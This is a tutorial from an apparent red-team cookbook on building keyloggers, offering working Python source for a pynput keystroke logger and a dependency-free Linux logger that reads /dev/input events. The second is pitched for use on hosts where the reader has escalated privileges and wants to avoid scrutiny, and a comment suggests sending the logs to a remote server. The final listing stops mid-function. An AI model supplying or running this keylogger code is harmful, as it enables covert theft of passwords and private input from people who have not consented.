# **Potentially Unwanted Programs (PUPs) - Key Logging in Linux**

![alt text](https://github.com/0x00wolf/red-team-cookbook/blob/main/imgs/github.jpeg)

The title Malware holds a level of mystique that I believe is largely attributed to actions of its developers. In every case, Malware is performing a legitimate function, but for illegitimate reasons. Malware performs systems and network functions, utilizing operating system API calls, standard encryption techniques, and socket programming. A RAT that generates a zombie is a malicious system daemon, which performs a regular service without the user's consent, or working directly against their best interests.

With this in mind, as I have no malicious intent with the Malware that I program, I prefer to call them Potentially Unwanted Programs (PUPs). Part of my aim with the RTCB, is to develop my own skills further in cryptography, and network & systems programming.

# **Disclaimer**

Any program that logs key strokes globally has major security and privacy implications. Do not test the following unless you are using a device you own, and if so make any other users of that device aware immediately. The author does not condone the use of the following programs for the unlawful monitoring of other users' keystrokes. 

# **First, Set up a Virtual Environments to Test your PUPs**

Before you start developing your own potentially unwanted programs (PUPs), you need to set up a safe and isolated environment where you can test them without affecting your main system or network. On top of this, the RTCB suggests creating **virtual environments** specifc to the packages required for each PUP to simplify compiling with Nuitka. Venvs are self-contained directories that contain a Python installation and any packages you need for your project. Virtual environments allow you to create and switch between multiple Python environments, each with its own dependencies and settings. This way, you can avoid conflicts between different versions of packages or libraries, and keep your system clean and secure.

To create a virtual environment, you need the **venv** module, which is included in the standard library of Python 3. You can use the following command to create a new virtual environment in the specified directory:

```bash
python -m venv /path/to/new/virtual/environment
```

This command will create the directory if it doesn't exist already, and place a **pyvenv.cfg** file in it with a **home** key pointing to the Python installation from which the command was run. A common name for the directory is **.venv**. The command will also create a **bin** (or **Scripts** on Windows) subdirectory containing a copy or symlink of the Python binary or binaries, depending on the platform or arguments used at environment creation time. Additionally, it will create an (initially empty) **lib/pythonX.Y/site-packages** subdirectory (on Windows, this is **Lib\site-packages**), where X and Y are the major and minor version numbers of Python.


**To activate the virtual environment, you need to run the following command:**

```bash
source ./venv/bin/activate
```

This will change your prompt to show that you are in the virtual environment, and modify the **PATH** environment variable to include the bin directory of the virtual environment. This way, you can use the Python interpreter and any packages installed in the virtual environment without specifying the full path. To deactivate the virtual environment, you can simply type **deactivate**.

Pip is typically out of date in a new venv. To update pip use:

```bash
pip install --upgrade pip
```

Now that you have set up your virtual environment, you are ready to start developing your own PUPs.

---


# **Key Loggers: The Black Box - Capturing Keyboard Input with Pynput**

The black box keylogger works on all platforms thanks the excellent library by Moses Palmer: https://github.com/moses-palmer/pynput

First, create & activate a new virtual environment and install the necessary library for this PUP with:

```bash
pip install pynput
```

The Black Box uses **queue**, **threading**, and **pynput** modules. The queue module provides a way to store and retrieve items in a first-in, first-out (FIFO) order, and also manages thread locking for you. The threading module provides a way to run a function in a separate thread of execution.

---

## **Black Box:**

```python
# by 0x00wolf:
import queue
import threading
from pynput import keyboard


def worker():
    key_string = ''
    while True:
        key = q.get()
        try:
            key_string += str(key.char)
        except AttributeError:
            if key == key.space:
                key_string += ' '
            elif key == key.backspace:
                key_string = key_string[:-1]
            elif key == key.shift:
                pass
            elif key == key.enter:
                key_string += '\\n'
            elif key == key.alt:
                pass
            elif key == key.tab:
                pass
            elif key == key.ctrl:
                pass
            else:
                key_string += str(key)

        if len(key_string) >= 20:
            with open('logfile.txt', 'a') as f:
                f.write(key_string)
            key_string = ''

        q.task_done()


def on_press(key):
    q.put(key)


q = queue.Queue()  # 1) Create a Queue object
t = threading.Thread(target=worker)  # 2) Initialize the worker function in a separate Thread
t.start()  
listener = keyboard.Listener(on_press=on_press)  # 3) Initialize the Pynput Listener object
listener.start()
```

---

## **The Black Box keylogger works as follows:**

1) It creates a queue object that will store the key events.
2) It creates a thread object that will run a worker function in the background. The worker function will get the key events from the queue, convert them to strings, and append them to a key_string variable. It will also handle some special keys, such as space, backspace, enter, and shift, by adding the appropriate characters to the key_string. If the key_string reaches a certain length (20 in this example), it will open a file named logfile.txt in append mode and write the key_string to it. Then, it will reset the key_string to an empty string.
3) It creates a keyboard listener object that will monitor the keyboard events and call an on_press function for each key press. The on_press function will simply put the key event into the queue.

The queue and threading is to ensure that the pynput module doesn't block the main thread while listening to the keyboard events. You can learn more about the pynput module from https://pynput.readthedocs.io/.

---

# **Key Loggers: Linux - Interpreting /dev/input/ events**

Linux expands the concept of a file to every component of your computer. Each device attached to your computer will have a corresponding file that represents a binary stream of input data, which lives in the `/dev/input/` directory. To listen to keystrokes globally on a Linux box, we need the account we are using to have reading rights to the input events, which generally will be limited to root access. 

Almost all Linux boxes will have an installation of Python. Therefore, if you have been able to escalate privileges, but don’t have an installation of Pip, or are concerned that a download might trigger additional scrutiny, the ability to whip up a keylogger in vanilla Python could be advantageous. You could accomplish the same thing in a lower level language, but chances are Python will be there, and it’s significantly more complex to implement parsing of the event structs in C.

---

## **Exploring /dev/input**

To view the different event streams running in your computer:

```bash
ls -l /dev/input/ 
```

To discover which event is mapped to the keyboard you can use the following command:

```bash
cat /proc/bus/input/devices
```

Which returns a list of all the devices currently mapped to your computer and their associated event codes. To save some time:
 
```bash
cat /proc/bus/input/devices | grep keyboard -A 8
```

Look for the number associated with the event from the information that is returned.

---

## **You can determine which event is associated with the keyboard programmatically with:**

I adapted this script from code I read @ The Hacker's Diary: https://thehackerdiary.wordpress.com/2017/04/21/exploring-devinput-1/


```python
import struct
import sys
from datetime import datetime


def get_keyboard_event_file(token_to_look_for):
    """This function iterates through /proc/bus/input/devices and prints out the information for the keyboard including the event file."""
    section = ""
    event_name = ""

    with open("/proc/bus/input/devices", "r") as fp:
        for line in fp:
            if line.strip() == "":
                if token_to_look_for in section and "mouse" not in section.lower():
                    print(f"Found [{token_to_look_for}] in:\n{section}")
                    for section_line in section.split('\n'):
                        if "Handlers=" in section_line.strip() and event_name == "":
                            print(f"Found Handlers line: [{section_line}]")
                            event_name = section_line.strip().split(' ')[-1]
                            print(f"Found event_name [{event_name}]")
                            return "/dev/input/" + event_name
                section = ""
            else:
                section += line

    if event_name == "":
        raise Exception(f"No event name was found for the token [{token_to_look_for}]")


if __name__ == '__main__':
    keyboard_event_file = ""
    try:
        keyboard_event_file = get_keyboard_event_file("EV=120013")
    except Exception as err:
        print(f"Couldn't get the keyboard event file due to error [{str(err)}]")
    print(keyboard_event_file)
```

**Look for the number associated with the event from the information that is returned.**

---

## **View the Binary Data Stream**

Having identified your event code we can use cat to examine the binary data from the keyboards input:

```bash
sudo cat /dev/input/eventX
```

Type something and watch the binary data stream appear...

---

## **Interpreting the binary event stream:**

The structure of the binary data is found in the Linux docs: https://www.kernel.org/doc/Documentation/input/input.txt

The keycodes for the keys being pressed can be extracted via a struct object, which is comprised as follows:

```c
struct input_event {
	struct timeval time;
	unsigned short type;
	unsigned short code;
	unsigned int value;
};
```
The first 16 bits contain the system time, and the next 8 bits contain the event code and the value. The value can be 1 for pressed, 2 for held, or 0 for released.

---

## **Viewing Input Event Codes & Values in Python**

This is a simple method of viewing the binary keyboard events unpacked values from the event struct that I cooked up:

```python
import struct

f = open("/dev/input/event3", "rb")  # Open the file in the read-binary mode

try:
    while True:
        data = f.read(24)
        (seconds, microseconds, event_type, event_code, value) = struct.unpack('llHHI', data)
        if event_type == 1:
            print(f"event code: {event_code}, value: {value}")
except KeyboardInterrupt:
    f.close()
    print("goodbye")
    print("goodbye")
```

---

## **Viewing Input Event Codes and Values in C**

You can accomplish the same thing in C, but it starts to get drastically more complicated when you start to input keyboard logic:

```c
#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>

void INThandler(){
        exit(0);
}

int main()
{
        char devname[] = "/dev/input/event3";
        int device = open(devname, O_RDONLY);
        struct input_event ev;

        signal(SIGINT, INThandler);

        while(1)
        {
                read(device,&ev, sizeof(ev));
                if(ev.type == 1 && ev.value == 1 || ev.value == 2 || ev.value == 0){
                        printf("Key: %i State: %i\n",ev.code,ev.value);
                }
        }
}
```

---

## Parsing Linux Event Codes Into Keys

You can use `cat` to view Linux's extensive set of keycodes using:

```bash
cat /usr/include/linux/input-event-codes.h
```

or at Linus Torvald's Linux Kernel repo: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/input-event-codes.h

There are a huge number of event codes. The Linux Kernel handles interpreting keyboard events, including logic for when Shift is held, or caps lock is on, or when both are held. As Python is installed by default on Linux installations, we'll work out the logic for parsing keystrokes in Python. 

---

## Mapping Out the Keycodes

I created this simple Python program to parse the keycodes from `input-event-codes.h`.

```python
# Generates a python friendly list of all the potential keycodes
keymap = open('keymap.py', 'w')
keymap.write('keymap = ')

keymap_list = []

with open("/usr/include/linux/input-event-codes.h", "r") as fp:
    data = fp.readlines()

for line in data:
    line = line.strip()
    if 'KEY_' in line:
        keymap_list.append(line.split()[1].replace('KEY_', ''))

keymap.write(str(keymap_list))
keymap.close()
```

For my solution, I used two lists to match keycodes to keys, and then depending on the state, my program will select the appropriate list. The above script wil generate a Python file with capital letters. Admittedly I did some manual conversion for special symbols in the second list.

---

# **Key Loggers: Vanilla Python Keylogger**

This keylogger will run out of the box on any Python 3 installation (root privileges are most likely required). It uses three threads and two queues. 

1) The Producer thread fetches keyboard events into event struct sized portions and places them into the first queue. 

2) The Consumer thread grabs an event from the first queue, parses the event into a keystroke, and places the keystroke into the second queue. This was the tricky part, handling state & user input.

3) The Recorder thread grabs a keystroke from the second queue, and then writes it to a file. It also handles backspaces, opening the file and rewriting it with the last key sliced off.

---

## **The Code Works as Follows:**

```python
 # Vanilla Python keylogger
import struct
import sys
from threading import Thread
from queue import Queue


KEYMAP = ['RESERVED', 'ESC', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', 'BACKSPACE', '<\\t>', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '{', '}', '<\\n>', '<LEFTCTRL>', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ':', '"', '~', 'SHIFT', 'BACKSLASH', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 'SHIFT', 'KPASTERISK', '<LEFTALT>', ' ', 'CAPSLOCK', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'NUMLOCK', 'SCROLLLOCK', 'KP7', 'KP8', 'KP9', 'KPMINUS', 'KP4', 'KP5', 'KP6', 'KPPLUS', 'KP1', 'KP2', 'KP3', 'KP0', 'KPDOT', 'ZENKAKUHANKAKU', '102ND', 'F11', 'F12', 'RO', 'KATAKANA', 'HIRAGANA', 'HENKAN', 'KATAKANAHIRAGANA', 'MUHENKAN', 'KPJPCOMMA', 'KPENTER', 'RIGHTCTRL', 'KPSLASH', 'SYSRQ', 'RIGHTALT', 'LINEFEED', 'HOME', 'UP', 'PAGEUP', 'LEFT', 'RIGHT', 'END', 'DOWN', 'PAGEDOWN', 'INSERT', 'DELETE', 'MACRO', 'MUTE', 'VOLUMEDOWN', 'VOLUMEUP', 'POWER', 'KPEQUAL', 'KPPLUSMINUS', 'PAUSE', 'SCALE', 'KPCOMMA', 'HANGEUL', 'HANGUEL', 'HANJA', 'YEN', 'LEFTMETA', 'RIGHTMETA', 'COMPOSE', 'STOP', 'AGAIN', 'PROPS', 'UNDO', 'FRONT', 'COPY', 'OPEN', 'PASTE', 'FIND', 'CUT', 'HELP', 'MENU', 'CALC', 'SETUP', 'SLEEP', 'WAKEUP', 'FILE', 'SENDFILE', 'DELETEFILE', 'XFER', 'PROG1', 'PROG2', 'WWW', 'MSDOS', 'COFFEE', 'SCREENLOCK', 'ROTATE_DISPLAY', 'DIRECTION', 'CYCLEWINDOWS', 'MAIL', 'BOOKMARKS', 'COMPUTER', 'BACK', 'FORWARD', 'CLOSECD', 'EJECTCD', 'EJECTCLOSECD', 'NEXTSONG', 'PLAYPAUSE', 'PREVIOUSSONG', 'STOPCD', 'RECORD', 'REWIND', 'PHONE', 'ISO', 'CONFIG', 'HOMEPAGE', 'REFRESH', 'EXIT', 'MOVE', 'EDIT', 'SCROLLUP', 'SCROLLDOWN', 'KPLEFTPAREN', 'KPRIGHTPAREN', 'NEW', 'REDO', 'F13', 'F14', 'F15', 'F16', 'F17', 'F18', 'F19', 'F20', 'F21', 'F22', 'F23', 'F24', 'PLAYCD', 'PAUSECD', 'PROG3', 'PROG4', 'ALL_APPLICATIONS', 'DASHBOARD', 'SUSPEND', 'CLOSE', 'PLAY', 'FASTFORWARD', 'BASSBOOST', 'PRINT', 'HP', 'CAMERA', 'SOUND', 'QUESTION', 'EMAIL', 'CHAT', 'SEARCH', 'CONNECT', 'FINANCE', 'SPORT', 'SHOP', 'ALTERASE', 'CANCEL', 'BRIGHTNESSDOWN', 'BRIGHTNESSUP', 'MEDIA', 'SWITCHVIDEOMODE', 'KBDILLUMTOGGLE', 'KBDILLUMDOWN', 'KBDILLUMUP', 'SEND', 'REPLY', 'FORWARDMAIL', 'SAVE', 'DOCUMENTS', 'BATTERY', 'BLUETOOTH', 'WLAN', 'UWB', 'UNKNOWN', 'VIDEO_NEXT', 'VIDEO_PREV', 'BRIGHTNESS_CYCLE', 'BRIGHTNESS_AUTO', 'BRIGHTNESS_ZERO', 'DISPLAY_OFF', 'WWAN', 'WIMAX', 'RFKILL', 'MICMUTE', 'OK', 'SELECT', 'GOTO', 'CLEAR', 'POWER2', 'OPTION', 'INFO', 'TIME', 'VENDOR', 'ARCHIVE', 'PROGRAM', 'CHANNEL', 'FAVORITES', 'EPG', 'PVR', 'MHP', 'LANGUAGE', 'TITLE', 'SUBTITLE', 'ANGLE', 'FULL_SCREEN', 'ZOOM', 'MODE', 'KEYBOARD', 'ASPECT_RATIO', 'SCREEN', 'PC', 'TV', 'TV2', 'VCR', 'VCR2', 'SAT', 'SAT2', 'CD', 'TAPE', 'RADIO', 'TUNER', 'PLAYER', 'TEXT', 'DVD', 'AUX', 'MP3', 'AUDIO', 'VIDEO', 'DIRECTORY', 'LIST', 'MEMO', 'CALENDAR', 'RED', 'GREEN', 'YELLOW', 'BLUE', 'CHANNELUP', 'CHANNELDOWN', 'FIRST', 'LAST', 'AB', 'NEXT', 'RESTART', 'SLOW', 'SHUFFLE', 'BREAK', 'PREVIOUS', 'DIGITS', 'TEEN', 'TWEN', 'VIDEOPHONE', 'GAMES', 'ZOOMIN', 'ZOOMOUT', 'ZOOMRESET', 'WORDPROCESSOR', 'EDITOR', 'SPREADSHEET', 'GRAPHICSEDITOR', 'PRESENTATION', 'DATABASE', 'NEWS', 'VOICEMAIL', 'ADDRESSBOOK', 'MESSENGER', 'DISPLAYTOGGLE', 'BRIGHTNESS_TOGGLE', 'SPELLCHECK', 'LOGOFF', 'DOLLAR', 'EURO', 'FRAMEBACK', 'FRAMEFORWARD', 'CONTEXT_MENU', 'MEDIA_REPEAT', '10CHANNELSUP', '10CHANNELSDOWN', 'IMAGES', 'NOTIFICATION_CENTER', 'PICKUP_PHONE', 'HANGUP_PHONE', 'DEL_EOL', 'DEL_EOS', 'INS_LINE', 'DEL_LINE', 'FN', 'FN_ESC', 'FN_F1', 'FN_F2', 'FN_F3', 'FN_F4', 'FN_F5', 'FN_F6', 'FN_F7', 'FN_F8', 'FN_F9', 'FN_F10', 'FN_F11', 'FN_F12', 'FN_1', 'FN_2', 'FN_D', 'FN_E', 'FN_F', 'FN_S', 'FN_B', 'FN_RIGHT_SHIFT', 'BRL_DOT1', 'BRL_DOT2', 'BRL_DOT3', 'BRL_DOT4', 'BRL_DOT5', 'BRL_DOT6', 'BRL_DOT7', 'BRL_DOT8', 'BRL_DOT9', 'BRL_DOT10', 'NUMERIC_0', 'NUMERIC_1', 'NUMERIC_2', 'NUMERIC_3', 'NUMERIC_4', 'NUMERIC_5', 'NUMERIC_6', 'NUMERIC_7', 'NUMERIC_8', 'NUMERIC_9', 'NUMERIC_STAR', 'NUMERIC_POUND', 'NUMERIC_A', 'NUMERIC_B', 'NUMERIC_C', 'NUMERIC_D', 'CAMERA_FOCUS', 'WPS_BUTTON', 'TOUCHPAD_TOGGLE', 'TOUCHPAD_ON', 'TOUCHPAD_OFF', 'CAMERA_ZOOMIN', 'CAMERA_ZOOMOUT', 'CAMERA_UP', 'CAMERA_DOWN', 'CAMERA_LEFT', 'CAMERA_RIGHT', 'ATTENDANT_ON', 'ATTENDANT_OFF', 'ATTENDANT_TOGGLE', 'LIGHTS_TOGGLE', 'ALS_TOGGLE', 'ROTATE_LOCK_TOGGLE', 'BUTTONCONFIG', 'TASKMANAGER', 'JOURNAL', 'CONTROLPANEL', 'APPSELECT', 'SCREENSAVER', 'VOICECOMMAND', 'ASSISTANT', 'KBD_LAYOUT_NEXT', 'EMOJI_PICKER', 'DICTATE', 'CAMERA_ACCESS_ENABLE', 'CAMERA_ACCESS_DISABLE', 'CAMERA_ACCESS_TOGGLE', 'BRIGHTNESS_MIN', 'BRIGHTNESS_MAX', 'KBDINPUTASSIST_PREV', 'KBDINPUTASSIST_NEXT', 'KBDINPUTASSIST_PREVGROUP', 'KBDINPUTASSIST_NEXTGROUP', 'KBDINPUTASSIST_ACCEPT', 'KBDINPUTASSIST_CANCEL', 'RIGHT_UP', 'RIGHT_DOWN', 'LEFT_UP', 'LEFT_DOWN', 'ROOT_MENU', 'MEDIA_TOP_MENU', 'NUMERIC_11', 'NUMERIC_12', 'AUDIO_DESC', '3D_MODE', 'NEXT_FAVORITE', 'STOP_RECORD', 'PAUSE_RECORD', 'VOD', 'UNMUTE', 'FASTREVERSE', 'SLOWREVERSE', 'DATA', 'ONSCREEN_KEYBOARD', 'PRIVACY_SCREEN_TOGGLE', 'SELECTIVE_SCREENSHOT', 'NEXT_ELEMENT', 'PREVIOUS_ELEMENT', 'AUTOPILOT_ENGAGE_TOGGLE', 'MARK_WAYPOINT', 'SOS', 'NAV_CHART', 'FISHING_CHART', 'SINGLE_RANGE_RADAR', 'DUAL_RANGE_RADAR', 'RADAR_OVERLAY', 'TRADITIONAL_SONAR', 'CLEARVU_SONAR', 'SIDEVU_SONAR', 'NAV_INFO', 'BRIGHTNESS_MENU', 'The', 'e.g.', 'The', 'FOO', 'MACRO1', 'MACRO2', 'MACRO3', 'MACRO4', 'MACRO5', 'MACRO6', 'MACRO7', 'MACRO8', 'MACRO9', 'MACRO10', 'MACRO11', 'MACRO12', 'MACRO13', 'MACRO14', 'MACRO15', 'MACRO16', 'MACRO17', 'MACRO18', 'MACRO19', 'MACRO20', 'MACRO21', 'MACRO22', 'MACRO23', 'MACRO24', 'MACRO25', 'MACRO26', 'MACRO27', 'MACRO28', 'MACRO29', 'MACRO30', 'MACRO_RECORD_START', 'MACRO_RECORD_STOP', 'MACRO_RECORD_START', 'MACRO_RECORD_STOP', 'MACRO_PRESET_CYCLE', 'MACRO_PRESET1', 'MACRO_PRESET2', 'MACRO_PRESET3', 'have', 'KBD_LCD_MENU1', 'KBD_LCD_MENU2', 'KBD_LCD_MENU3', 'KBD_LCD_MENU4', 'KBD_LCD_MENU5', 'MIN_INTERESTING', 'MAX', 'CNT']
SHIFTED = ['RESERVED', 'ESC', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', 'BACKSPACE', '<\\t>', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '[', ']', '<\\n>', '<LEFTCTRL>', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ';', "'", '`', 'SHIFT', 'BACKSLASH', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', '<', '>', '?', 'SHIFT', 'KPASTERISK', '<LEFTALT>', ' ', 'CAPSLOCK', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'NUMLOCK', 'SCROLLLOCK', 'KP7', 'KP8', 'KP9', 'KPMINUS', 'KP4', 'KP5', 'KP6', 'KPPLUS', 'KP1', 'KP2', 'KP3', 'KP0', 'KPDOT', 'ZENKAKUHANKAKU', '102ND', 'F11', 'F12', 'RO', 'KATAKANA', 'HIRAGANA', 'HENKAN', 'KATAKANAHIRAGANA', 'MUHENKAN', 'KPJPCOMMA', 'KPENTER', 'RIGHTCTRL', 'KPSLASH', 'SYSRQ', 'RIGHTALT', 'LINEFEED', 'HOME', 'UP', 'PAGEUP', 'LEFT', 'RIGHT', 'END', 'DOWN', 'PAGEDOWN', 'INSERT', 'DELETE', 'MACRO', 'MUTE', 'VOLUMEDOWN', 'VOLUMEUP', 'POWER', 'KPEQUAL', 'KPPLUSMINUS', 'PAUSE', 'SCALE', 'KPCOMMA', 'HANGEUL', 'HANGUEL', 'HANJA', 'YEN', 'LEFTMETA', 'RIGHTMETA', 'COMPOSE', 'STOP', 'AGAIN', 'PROPS', 'UNDO', 'FRONT', 'COPY', 'OPEN', 'PASTE', 'FIND', 'CUT', 'HELP', 'MENU', 'CALC', 'SETUP', 'SLEEP', 'WAKEUP', 'FILE', 'SENDFILE', 'DELETEFILE', 'XFER', 'PROG1', 'PROG2', 'WWW', 'MSDOS', 'COFFEE', 'SCREENLOCK', 'ROTATE_DISPLAY', 'DIRECTION', 'CYCLEWINDOWS', 'MAIL', 'BOOKMARKS', 'COMPUTER', 'BACK', 'FORWARD', 'CLOSECD', 'EJECTCD', 'EJECTCLOSECD', 'NEXTSONG', 'PLAYPAUSE', 'PREVIOUSSONG', 'STOPCD', 'RECORD', 'REWIND', 'PHONE', 'ISO', 'CONFIG', 'HOMEPAGE', 'REFRESH', 'EXIT', 'MOVE', 'EDIT', 'SCROLLUP', 'SCROLLDOWN', 'KPLEFTPAREN', 'KPRIGHTPAREN', 'NEW', 'REDO', 'F13', 'F14', 'F15', 'F16', 'F17', 'F18', 'F19', 'F20', 'F21', 'F22', 'F23', 'F24', 'PLAYCD', 'PAUSECD', 'PROG3', 'PROG4', 'ALL_APPLICATIONS', 'DASHBOARD', 'SUSPEND', 'CLOSE', 'PLAY', 'FASTFORWARD', 'BASSBOOST', 'PRINT', 'HP', 'CAMERA', 'SOUND', 'QUESTION', 'EMAIL', 'CHAT', 'SEARCH', 'CONNECT', 'FINANCE', 'SPORT', 'SHOP', 'ALTERASE', 'CANCEL', 'BRIGHTNESSDOWN', 'BRIGHTNESSUP', 'MEDIA', 'SWITCHVIDEOMODE', 'KBDILLUMTOGGLE', 'KBDILLUMDOWN', 'KBDILLUMUP', 'SEND', 'REPLY', 'FORWARDMAIL', 'SAVE', 'DOCUMENTS', 'BATTERY', 'BLUETOOTH', 'WLAN', 'UWB', 'UNKNOWN', 'VIDEO_NEXT', 'VIDEO_PREV', 'BRIGHTNESS_CYCLE', 'BRIGHTNESS_AUTO', 'BRIGHTNESS_ZERO', 'DISPLAY_OFF', 'WWAN', 'WIMAX', 'RFKILL', 'MICMUTE', 'OK', 'SELECT', 'GOTO', 'CLEAR', 'POWER2', 'OPTION', 'INFO', 'TIME', 'VENDOR', 'ARCHIVE', 'PROGRAM', 'CHANNEL', 'FAVORITES', 'EPG', 'PVR', 'MHP', 'LANGUAGE', 'TITLE', 'SUBTITLE', 'ANGLE', 'FULL_SCREEN', 'ZOOM', 'MODE', 'KEYBOARD', 'ASPECT_RATIO', 'SCREEN', 'PC', 'TV', 'TV2', 'VCR', 'VCR2', 'SAT', 'SAT2', 'CD', 'TAPE', 'RADIO', 'TUNER', 'PLAYER', 'TEXT', 'DVD', 'AUX', 'MP3', 'AUDIO', 'VIDEO', 'DIRECTORY', 'LIST', 'MEMO', 'CALENDAR', 'RED', 'GREEN', 'YELLOW', 'BLUE', 'CHANNELUP', 'CHANNELDOWN', 'FIRST', 'LAST', 'AB', 'NEXT', 'RESTART', 'SLOW', 'SHUFFLE', 'BREAK', 'PREVIOUS', 'DIGITS', 'TEEN', 'TWEN', 'VIDEOPHONE', 'GAMES', 'ZOOMIN', 'ZOOMOUT', 'ZOOMRESET', 'WORDPROCESSOR', 'EDITOR', 'SPREADSHEET', 'GRAPHICSEDITOR', 'PRESENTATION', 'DATABASE', 'NEWS', 'VOICEMAIL', 'ADDRESSBOOK', 'MESSENGER', 'DISPLAYTOGGLE', 'BRIGHTNESS_TOGGLE', 'SPELLCHECK', 'LOGOFF', 'DOLLAR', 'EURO', 'FRAMEBACK', 'FRAMEFORWARD', 'CONTEXT_MENU', 'MEDIA_REPEAT', '10CHANNELSUP', '10CHANNELSDOWN', 'IMAGES', 'NOTIFICATION_CENTER', 'PICKUP_PHONE', 'HANGUP_PHONE', 'DEL_EOL', 'DEL_EOS', 'INS_LINE', 'DEL_LINE', 'FN', 'FN_ESC', 'FN_F1', 'FN_F2', 'FN_F3', 'FN_F4', 'FN_F5', 'FN_F6', 'FN_F7', 'FN_F8', 'FN_F9', 'FN_F10', 'FN_F11', 'FN_F12', 'FN_1', 'FN_2', 'FN_D', 'FN_E', 'FN_F', 'FN_S', 'FN_B', 'FN_RIGHT_SHIFT', 'BRL_DOT1', 'BRL_DOT2', 'BRL_DOT3', 'BRL_DOT4', 'BRL_DOT5', 'BRL_DOT6', 'BRL_DOT7', 'BRL_DOT8', 'BRL_DOT9', 'BRL_DOT10', 'NUMERIC_0', 'NUMERIC_1', 'NUMERIC_2', 'NUMERIC_3', 'NUMERIC_4', 'NUMERIC_5', 'NUMERIC_6', 'NUMERIC_7', 'NUMERIC_8', 'NUMERIC_9', 'NUMERIC_STAR', 'NUMERIC_POUND', 'NUMERIC_A', 'NUMERIC_B', 'NUMERIC_C', 'NUMERIC_D', 'CAMERA_FOCUS', 'WPS_BUTTON', 'TOUCHPAD_TOGGLE', 'TOUCHPAD_ON', 'TOUCHPAD_OFF', 'CAMERA_ZOOMIN', 'CAMERA_ZOOMOUT', 'CAMERA_UP', 'CAMERA_DOWN', 'CAMERA_LEFT', 'CAMERA_RIGHT', 'ATTENDANT_ON', 'ATTENDANT_OFF', 'ATTENDANT_TOGGLE', 'LIGHTS_TOGGLE', 'ALS_TOGGLE', 'ROTATE_LOCK_TOGGLE', 'BUTTONCONFIG', 'TASKMANAGER', 'JOURNAL', 'CONTROLPANEL', 'APPSELECT', 'SCREENSAVER', 'VOICECOMMAND', 'ASSISTANT', 'KBD_LAYOUT_NEXT', 'EMOJI_PICKER', 'DICTATE', 'CAMERA_ACCESS_ENABLE', 'CAMERA_ACCESS_DISABLE', 'CAMERA_ACCESS_TOGGLE', 'BRIGHTNESS_MIN', 'BRIGHTNESS_MAX', 'KBDINPUTASSIST_PREV', 'KBDINPUTASSIST_NEXT', 'KBDINPUTASSIST_PREVGROUP', 'KBDINPUTASSIST_NEXTGROUP', 'KBDINPUTASSIST_ACCEPT', 'KBDINPUTASSIST_CANCEL', 'RIGHT_UP', 'RIGHT_DOWN', 'LEFT_UP', 'LEFT_DOWN', 'ROOT_MENU', 'MEDIA_TOP_MENU', 'NUMERIC_11', 'NUMERIC_12', 'AUDIO_DESC', '3D_MODE', 'NEXT_FAVORITE', 'STOP_RECORD', 'PAUSE_RECORD', 'VOD', 'UNMUTE', 'FASTREVERSE', 'SLOWREVERSE', 'DATA', 'ONSCREEN_KEYBOARD', 'PRIVACY_SCREEN_TOGGLE', 'SELECTIVE_SCREENSHOT', 'NEXT_ELEMENT', 'PREVIOUS_ELEMENT', 'AUTOPILOT_ENGAGE_TOGGLE', 'MARK_WAYPOINT', 'SOS', 'NAV_CHART', 'FISHING_CHART', 'SINGLE_RANGE_RADAR', 'DUAL_RANGE_RADAR', 'RADAR_OVERLAY', 'TRADITIONAL_SONAR', 'CLEARVU_SONAR', 'SIDEVU_SONAR', 'NAV_INFO', 'BRIGHTNESS_MENU', 'The', 'e.g.', 'The', 'FOO', 'MACRO1', 'MACRO2', 'MACRO3', 'MACRO4', 'MACRO5', 'MACRO6', 'MACRO7', 'MACRO8', 'MACRO9', 'MACRO10', 'MACRO11', 'MACRO12', 'MACRO13', 'MACRO14', 'MACRO15', 'MACRO16', 'MACRO17', 'MACRO18', 'MACRO19', 'MACRO20', 'MACRO21', 'MACRO22', 'MACRO23', 'MACRO24', 'MACRO25', 'MACRO26', 'MACRO27', 'MACRO28', 'MACRO29', 'MACRO30', 'MACRO_RECORD_START', 'MACRO_RECORD_STOP', 'MACRO_RECORD_START', 'MACRO_RECORD_STOP', 'MACRO_PRESET_CYCLE', 'MACRO_PRESET1', 'MACRO_PRESET2', 'MACRO_PRESET3', 'have', 'KBD_LCD_MENU1', 'KBD_LCD_MENU2', 'KBD_LCD_MENU3', 'KBD_LCD_MENU4', 'KBD_LCD_MENU5', 'MIN_INTERESTING', 'MAX', 'CNT']
OUTFILE = 'loggylogs.txt'
STRUCT_FORMAT = 'llHHI'
EVENT_SIZE = struct.calcsize('llHHI')


q = Queue()  # Producer sends event to Parser
q2 = Queue()  # Parser sends mapped character to Writer


def recorder():
    """Grabs items from the 2nd queue (parsed data), and writes it to the logfile.
    This could be replaced with a function to send the data to a remote server"""
    while True:
        writing = q2.get(block=True)  # Get the key 
        if writing == 'BACKSPACE':  # If key is 'BACKSPACE'
            with open(OUTFILE, 'r') as f:
                data = f.read()
                data = data[:-1]  # Slice off the last character
            with open(OUTFILE, 'w') as f:
                f.write(data)  # write it to the file
        elif len(writing) <= 4:  # Otherwise
            print(writing, end='')  # Print for debug
            with open(OUTFILE, 'a+') as f:
                f.write(writing)  # Write the keystroke to file


def consumer():
    """Parses the data from the keystrokes into a mapped character (or string) from one of the two
    keycode lists."""
    shift = False  # Boolean for Shift
    caps_lock = False   # Boolean for Caps Lock

    while True:
        key = ''
        event = q.get(block=True)  # Get the event

        # Unpack the event:
        (seconds, microseconds, event_type, event_code, value) = struct.unpack(STRUCT_FORMAT, event)
        # for debugging codes: # print(f"shift={shift}, code={event_code}, value={value}, event_type={event_type}")

        if event_type == 1:
	
	    # if leftshift or rightshift & value is 0 (unpressed)
            if event_code == 42 and value == 0 or event_code == 54 and value == 0:
                shift = False

